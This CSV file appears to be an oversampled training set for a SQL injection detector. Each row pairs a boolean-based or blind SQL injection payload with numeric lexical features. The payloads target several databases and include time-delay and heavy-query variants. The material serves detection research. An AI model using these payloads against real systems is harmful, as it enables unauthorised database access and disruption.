id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000291,attack,boolean,"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000530,1.8997111479095206,159.67778242499523,37.0,4.064578317006922,60.45279288123447,16.741663181253585,58.16110878750239,24.322217575004778,0.3781553071519108,0.10497666428301891,0.36437201224217297,0.1524960163228973,4.0,3.9999999999999996,0.5805543937511947,0.0,0.0,1.5805543937511948,0.0,8.0,1.1611087875023893,0.0,0.0,6.161108787502389,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.4194456062488054,0.5805543937511947,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000292,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000497,0.3296011299449915,146.00172183842636,32.72742925803876,4.3263725443227585,83.95571943529072,9.0,36.45485851607752,16.59114388705814,0.5747108871613195,0.06182870070571064,0.2498922058274996,0.11356820630547032,3.591143887058142,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.8637146290193806,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.8637146290193805
SMOTE_000293,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000617,1.1149488518387465,128.0,34.0,3.831473701575858,36.52338520892784,15.476614791072157,50.0,26.0,0.28533894694474876,0.12091105305525122,0.390625,0.203125,1.0,0.0,2.0,0.0,0.0,1.0,0.0,11.0,1.0,2.0,1.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.5233852089278433,0.4766147910721566,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000294,attack,boolean,end and '%'  =  ',nearest_attack_euclidean,R000579,1.133384785605849,15.72270117310805,7.361350586554035,2.5412304649443582,4.722701173108064,0.6386494134459646,5.680675293277027,4.680675293277018,0.2893652167610351,0.049126877957382006,0.3630555336971081,0.2984523715844749,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.680675293277017,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.680675293277017,0.31932470672298296,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000295,attack,boolean,"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",nearest_attack_euclidean,R000313,0.10824180563564217,83.47887250606317,21.791549002425274,3.1758876036990755,12.583098004850548,21.0,40.0,9.895774501212637,0.15050555904590485,0.25164913763904057,0.47933169074102966,0.11851361257402496,0.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.8957745012126366,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000296,attack,boolean,1  )   as mtnw where 7293  =  7293 and 2603  =  5764--,nearest_attack_euclidean,R000697,1.3514547054945243,51.92965115204673,23.828139539181308,3.872896364959561,14.0,15.343720921637388,16.75779069122804,5.828139539181308,0.2702134859680067,0.2943147619741589,0.32206612871862167,0.11340562333921272,0.0,0.0,2.0,0.0,0.0,1.5859302304093468,0.0,1.414069769590654,0.0,0.4140697695906532,0.4140697695906532,3.585930230409347,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.5859302304093468,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.585930230409347
SMOTE_000297,attack,boolean,end and   (  'nchh'  =  'nchh,nearest_attack_euclidean,R000233,0.5171975427238404,32.014115087017444,10.50235251450291,2.825162377544824,14.0,0.0,12.511762572514542,5.50235251450291,0.44726861966505943,0.0,0.3807400872436899,0.17199129309125072,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.5023525145029097,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000298,attack,boolean,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000202,0.10822824804890052,198.42790942627266,34.0,3.80282634909111,57.0,32.0,77.94232754101813,31.485581885254533,0.2873035121002756,0.1612931997755933,0.39273467056662686,0.15866861755750422,1.0,0.0,2.0,0.0,0.0,2.0,0.0,16.485581885254533,0.0,1.0,3.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,7.0
SMOTE_000299,attack,boolean,"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000708,0.9404007558583559,135.39003780347448,32.23900378034745,4.134900139912181,68.9560151213898,8.619501890173725,39.9560151213898,17.858505670521176,0.5098997919443162,0.06373747399303953,0.2945556050263993,0.13180712903624495,0.0,1.0,2.0,0.0,1.0,1.0,0.0,5.619501890173725,1.0,0.0,2.6195018901737246,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.6195018901737248,0.38049810982627513,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000300,attack,boolean,"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000716,1.2081047696974678,152.77637210031295,29.984207308553543,3.6105080361221926,39.507896345723225,16.0,66.22109768025038,31.047378074339363,0.26166830042529104,0.10612540507167723,0.4285610822491297,0.20364521225390203,0.0,3.9999999999999996,0.0,0.0,0.0,2.0,0.0,13.047378074339367,1.9999999999999998,2.0,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.5078963457232275,0.49210365427677244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000301,attack,boolean,"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dbxi"" like ""dbxi",nearest_attack_euclidean,R000635,0.29530557434889065,277.39938209019766,36.173374527320156,3.7122847843980313,85.30650189071937,29.0,116.26625472679844,46.826625472679844,0.30754007641030223,0.10458784257930281,0.41902188998463935,0.1688501910257556,0.0,3.9999999999999996,0.0,0.0,0.0,1.1733745273201568,0.0,25.653250945359687,0.0,2.0,4.0,11.173374527320156,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,9.0
SMOTE_000302,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000627,0.00233670315315172,65.0,23.98506580347552,3.6246643201422906,11.000000000000007,21.0,24.0,9.0,0.16923076923076924,0.3230769230769231,0.36923076923076925,0.13846153846153847,1.0,0.0,2.0,0.0,0.0,2.0,0.0,3.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000303,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000345,0.18334481243274833,154.7916718716435,34.886904018336644,4.298252302758864,77.13095981663356,16.886904018336644,42.886904018336644,17.886904018336644,0.4981044103217175,0.10914434125215389,0.2771453306583517,0.11560591776777689,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.8869040183366437,5.113095981663356,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.1130959816633568,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.113095981663356
SMOTE_000304,attack,boolean,"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000329,1.3277060339868565,242.84422077504706,38.0,3.7493853184082866,72.0,27.0,99.70351731253925,44.140703462507844,0.2966651193308606,0.11124941974907274,0.41031084836155063,0.18177461255851604,0.5703517312539246,0.4296482687460754,2.0,0.0,0.0,1.0,0.0,23.140703462507847,1.0,2.0,4.0,13.0,0.5703517312539246,0.4296482687460754,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,8.0
SMOTE_000305,attack,boolean,"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",nearest_attack_euclidean,R000431,0.5100593688284883,61.64484463106443,21.436466221647894,3.560136864510806,19.436466221647894,9.820837840941653,23.745864886591573,8.641675681883308,0.3269403729927216,0.16450659791169117,0.37046965243659713,0.1380833766589901,0.0,3.9999999999999996,0.0,0.0,0.0,1.0,0.0,3.23125676141248,0.0,0.2052094602354133,0.2052094602354133,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000306,attack,boolean,1  )   as mtnw where 7293  =  7293 and 2603  =  5764--,nearest_attack_euclidean,R000697,0.9094770788868165,60.63420577209001,23.442280384806,3.706726521378483,14.0,18.769121539224003,21.538243078448,6.326841154418002,0.23433202340062798,0.3101854710124976,0.3525629152814203,0.10291959030545411,0.0,0.0,2.0,0.0,0.4422803848060004,2.0,0.0,1.8845607696120013,0.0,0.0,0.0,4.442280384806001,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000307,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000444,0.173185079729499,94.28421746705997,29.342632620058996,3.7526972245364942,32.62815980344149,13.456843493411997,36.02789786017699,12.1713163100295,0.3465658549877057,0.14232005717408794,0.38163858628040054,0.12947550155780585,0.0,0.0,2.0,0.0,1.0,1.0571054366764994,0.0,6.114210873352999,0.0,1.0,1.0,4.057105436676499,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.05710543667649959,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0571054366764994
SMOTE_000308,attack,boolean,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""jebr"" like ""jebr",nearest_attack_euclidean,R000520,1.7742024093124782,304.13919799620385,39.50869987476274,4.000183111066969,116.10439849715286,34.0,111.54349937381369,42.49130012523726,0.38149244386234,0.11186836525607535,0.366789059609566,0.13985013127201865,0.0,3.9999999999999996,0.0,0.0,0.0,1.4913001252372626,0.0,23.017399749525474,0.982600250474525,3.0,3.0,7.491300125237263,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.0
SMOTE_000309,attack,boolean,"1   )    )    as aeat where 1007  =  1007 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000145,0.32755411081478747,159.14786406868012,31.284045310439964,3.995024669171302,74.0,18.0,47.14786406868011,20.0,0.46505917446906136,0.11312250189787978,0.29612665485763684,0.12569166877542198,0.0,0.14202265521998136,2.0,0.0,1.0,2.0,0.0,5.857977344780018,0.0,5.0,4.0,5.0,0.0,0.14202265521998145,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000310,attack,boolean,1   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  1233  =  1233,nearest_attack_euclidean,R000656,0.7409194779233462,85.50897940966641,15.96408236133434,2.6838390883747962,7.718572066167546,21.0,46.03591763866566,10.754489704833208,0.09063445753494057,0.24561343194864416,0.5380201972953016,0.12573191322111368,0.0,0.0,0.0,0.0,0.7544897048332072,2.0,0.0,7.508979409666415,0.0,0.24551029516679268,0.24551029516679246,2.7544897048332078,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000311,attack,boolean,"1'||  (  select 'uyfo' where 1236  =  1236 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000343,0.28133043113805023,168.1157183213654,31.578591606827022,4.107508508354261,77.1157183213654,18.0,47.0,26.0,0.4587042253889917,0.10706949387910054,0.27957034512876255,0.15465593560314525,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,2.0,0.0,1.0,1.0,0.11571832136540428,0.8842816786345958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,5.0
SMOTE_000312,attack,boolean,"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000654,0.0986306754855409,147.33821926097858,32.415445184755356,4.130445611731846,75.0306279022375,16.0,40.446073086992854,15.861518271748215,0.5091784105030626,0.10868507773596937,0.27446224955968324,0.10767426220128481,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.861518271748214,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000313,attack,boolean,"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",nearest_attack_euclidean,R000219,0.4115773230106806,335.74060390351167,28.1225564346093,3.139772664190014,79.34812078070233,47.0,162.16691877671627,47.22556434609302,0.2364311410237554,0.1403494777144674,0.48266448882966706,0.14055489243211017,0.0,1.3676693038279075,0.0,0.0,0.0,1.1225564346093024,0.0,34.73533860765581,0.0,0.0,0.0,11.1225564346093,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.1225564346093024,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.1225564346093
SMOTE_000314,attack,boolean,"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'ywxc'  =  'ywxc",nearest_attack_euclidean,R000452,1.4212148167386331,174.6296457959932,33.10185286224958,3.832287890918578,55.4074114489983,20.203705724499155,68.81482289799662,30.203705724499155,0.31966274561138486,0.11536579050055315,0.39031823031398977,0.1746532335740722,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.203705724499153,0.0,1.4745367844376056,2.0509264311247883,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6273160778119715,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.6273160778119715
SMOTE_000315,attack,boolean,"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000398,0.488946908014336,261.8672691298276,38.79252565224137,3.842003097594654,78.03737173879314,35.41494869551725,104.41494869551727,44.0,0.29795448854860573,0.1352235093121321,0.39876595183489294,0.16805605030436924,0.0,1.0,2.0,0.0,0.0,2.0,0.0,23.0,0.0,2.0,4.0,14.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.7925256522413724,0.2074743477586276,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,9.0
SMOTE_000316,attack,boolean," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000016,0.15249079058853118,59.0,21.0,3.5733824581848763,26.0,4.670185078982035,20.0,8.329814921017967,0.4406779661016949,0.07915567930478025,0.3389830508474576,0.14118330374606722,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,5.0
SMOTE_000317,attack,boolean,"-6971"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ifuh"" like ""ifuh",nearest_attack_euclidean,R000419,0.7298771428261227,360.35125212181777,37.67025042436356,3.723709035655254,103.18637733399956,47.505375636545324,148.32974957563644,61.32974957563645,0.28626151370320324,0.13181257752528688,0.41169154972651434,0.1702343590449955,0.0,3.9999999999999996,0.8351252121817779,0.0,0.0,2.164874787818222,0.0,30.0,0.32974957563644425,3.0,0.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.164874787818222,0.835125212181778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000318,attack,boolean,"1 and elt  (  3172  =  7243,7243  )  ",nearest_attack_euclidean,R000705,0.014044562718164661,37.141695917317776,16.031995852297563,3.276191513892997,6.009141672085022,13.0502791964676,14.063991704595125,4.018283344170035,0.16195869092338594,0.35135861818130765,0.3785309818074606,0.10815170908784588,0.0,0.0,0.004570836042509074,0.0,0.0,1.0045708360425092,0.0,2.0091416720850184,0.0,0.0,1.0,1.0091416720850175,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.004570836042508963,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0045708360425087
